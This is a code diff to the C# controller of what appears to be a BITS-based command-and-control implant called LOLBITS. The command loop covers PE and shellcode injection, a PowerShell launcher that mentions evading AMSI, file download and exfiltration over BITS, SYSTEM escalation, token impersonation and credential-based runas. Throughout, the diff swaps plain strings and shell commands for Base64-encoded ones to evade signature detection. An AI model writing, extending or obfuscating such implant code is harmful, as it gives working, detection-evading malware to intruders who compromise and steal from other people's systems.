@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
@@ -44,7 +43,7 @@ namespace LOLBITS.Controlling
         public void Start()
         {
 
-            const string startBits = "sc start BITS";
+            string startBits = Encoding.UTF8.GetString(Convert.FromBase64String("c2Mgc3RhcnQgQklUUw=="));
             Utils.ExecuteCommand(startBits, _sysCall);
             Thread.Sleep(500);
             var filePath = _tempPath + @"\" + _id;
@@ -72,7 +71,6 @@ namespace LOLBITS.Controlling
         private void Loop()
         {
             var exit = false;
-
             while (!exit)
             {
                 var filePath = _tempPath + @"\" + _id;
@@ -138,16 +136,16 @@ namespace LOLBITS.Controlling
                                     var arguments = new string[] { args };
 
                                     LauncherPE.Main(method, arguments, pe);
-                                    rps = "PE injected!";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("UEUgaW5qZWN0ZWQh"));
                                 }
                                 catch (Exception)
                                 {
-                                    rps = "ERR:Fatal error occurred while trying to inject the dll.\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZhdGFsIGVycm9yIG9jY3VycmVkIHdoaWxlIHRyeWluZyB0byBpbmplY3QgdGhlIGRsbC4="));
                                 }
                             }
                             else
                             {
-                                rps = "ERR:Dll not found!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkRsbCBub3QgZm91bmQh"));
                             }
 
                             break;
@@ -169,16 +167,16 @@ namespace LOLBITS.Controlling
                                 try
                                 {
                                     LauncherShellCode.Main(sh, _sysCall, pid);
-                                    rps = "Shellcode injected!\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("U2hlbGxjb2RlIGluamVjdGVkIQ=="));
                                 }
                                 catch (Exception)
                                 {
-                                    rps = "ERR:Fatal error occurred while trying to inject shellCode.\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZhdGFsIGVycm9yIG9jY3VycmVkIHdoaWxlIHRyeWluZyB0byBpbmplY3QgdGhlIHNoZWxsY29kZS4="));
                                 }
                             }
                             else
                             {
-                                rps = "ERR:Shellcode file not found!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOlNoZWxsY29kZSBmaWxlIG5vdCBmb3VuZCE="));
                             }
 
                             break;
@@ -186,16 +184,18 @@ namespace LOLBITS.Controlling
 
                     case "powershell":
                         {
-                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi", _sysCall);
+                            rps = Utils.ExecuteCommand(Encoding.UTF8.GetString(Convert.FromBase64String("cG93ZXJzaGVsbCAtViAyIC9DIFdyaXRlLUhvc3QgaGk=")), _sysCall);
 
                             if (rps.Contains("hi"))
                             {
                                 LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
-                                rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("WW91IHNob3VsZCBoYXZlIHlvdXIgUG93ZXJzaGVsbCBhdCA=")) + file.Commands[1] + ":" + file.Commands[2] + "!\n";
                             }
                             else
                             {
-                                rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String(
+                                    "VmVyc2lvbiAyIG9mIFBvd2Vyc2hlbGwgbm90IGF2YWlsYWJsZS4gVHJ5IGluamVjdGluZyB" +
+                                    "FdmlsU2Fsc2EgYnkgQ3liZXJWYWNhIGluIG9yZGVyIHRvIHVzZSBwb3dlcnNoZWxsIHdpdGhvdXQgYW0=")) + "si.\n";
                             }
 
                             break;
@@ -209,11 +209,11 @@ namespace LOLBITS.Controlling
                             if (_jobsManager.Get(_id, fileP, headers, BITS.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
                                 File.Copy(fileP, file.Commands[1], true);
-                                rps = "Dowload finished.\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RG93bG9hZCBmaW5pc2hlZC4="));
                             }
                             else
                             {
-                                rps = "ERR:Download failed!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkRvd25sb2FkIGZhaWxlZCE="));
                             }
 
                             break;
@@ -224,23 +224,25 @@ namespace LOLBITS.Controlling
                             {
                                 if (_jobsManager.Send(file.Commands[2], file.Commands[1]))
                                 {
-                                    rps = "Exfiltration succeed.\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RXhmaWx0cmF0aW9uIHN1Y2NlZWQu"));
 
                                 }
                                 else
-                                    rps = "ERR:Exfiltration failed!\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkV4ZmlsdHJhdGlvbiBmYWlsZWQh"));
                             }
                             else
-                                rps = "ERR:File to exfiltrate not found!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkZpbGUgdG8gZXhmaWx0cmF0ZSBub3QgZm91bmQh"));
 
                             break;
                         }
                     case "getsystem":
                         {
                             if (Utils.IsHighIntegrity(_sysCall))
-                                rps = _tokenManager.GetSystem(_sysCall) ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                                rps = _tokenManager.GetSystem(_sysCall) ? Encoding.UTF8.GetString(Convert.FromBase64String("V2UgYXJlIFN5c3RlbSE=")) :
+                                                                          Encoding.UTF8.GetString(Convert.FromBase64String("V2UgYXJlIFN5c3RlbSFcbkVS" +
+                                                                          "UjpQcm9jZXNzIGZhaWxlZCEgSXMgdGhpcyBwcm9jZXNzIHJ1bm5pbmcgd2l0aCBoaWdoIGludGVncml0eSBsZXZlbD8="));
                             else
-                                rps = "ERR:Process failed! Is this process running with high integrity level?\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOlByb2Nlc3MgZmFpbGVkISBJcyB0aGlzIHByb2Nlc3MgcnVubmluZyB3aXRoIGhpZ2ggaW50ZWdyaXR5IGxldmVsPw=="));
 
                             break;
                         }
@@ -271,7 +273,7 @@ namespace LOLBITS.Controlling
 
                             password = file.Commands[2];
 
-                            rps = TokenManager.RunAs(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";
+                            rps = TokenManager.RunAs(domain, user, password) ? "Success!" : Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOkludmFsaWQgY3JlZGVudGlhbHMu"));
 
                             break;
                         }
@@ -287,13 +289,13 @@ namespace LOLBITS.Controlling
                             try
                             {
                                 if (_tokenManager.Impersonate(int.Parse(file.Commands[1]), _sysCall))
-                                    rps = "Impersonation achieved!\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("SW1wZXJzb25hdGlvbiBhY2hpZXZlZCE="));
                                 else
-                                    rps = "ERR: Not enough privileges!\n";
+                                    rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBOb3QgZW5vdWdoIHByaXZpbGVnZXMh"));
                             }
                             catch
                             {
-                                rps = "ERR: Impersonation failed!\n";
+                                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBJbXBlcnNvbmF0aW9uIGZhaWxlZCE="));
                             }
 
                             break;
@@ -312,9 +314,9 @@ namespace LOLBITS.Controlling
                         }
                 }
             } 
-            catch(Exception e)
+            catch
             {
-                rps = "ERR: Something went wrong!";
+                rps = Encoding.UTF8.GetString(Convert.FromBase64String("RVJSOiBTb21ldGhpbmcgd2VudCB3cm9uZyE="));
             }
 
             var response = new Response(rps, _auth);
@@ -327,7 +329,7 @@ namespace LOLBITS.Controlling
         {
             var output = "\n";
             output = string.Concat(output, $"{"NAME",40}|{"PID",10}|{"ACCOUNT",40}|\n");
-            var cmd = "tasklist /v /fo csv";
+            var cmd = Encoding.UTF8.GetString(Convert.FromBase64String("dGFza2xpc3QgL3YgL2ZvIGNzdg=="));
 
             var o = Utils.ExecuteCommand(cmd, _sysCall);
             var spl = o.Split('\n');
@@ -351,7 +353,7 @@ namespace LOLBITS.Controlling
 
         private static string GetProcessOwner (int processId)
         {
-            var query = "Select * From Win32_Process Where ProcessID = " + processId;
+            var query = Encoding.UTF8.GetString(Convert.FromBase64String("U2VsZWN0ICogRnJvbSBXaW4zMl9Qcm9jZXNzIFdoZXJlIFByb2Nlc3NJRCA9IA==")) + processId;
             var moSearcher = new ManagementObjectSearcher(query);
             var moCollection = moSearcher.Get();
 
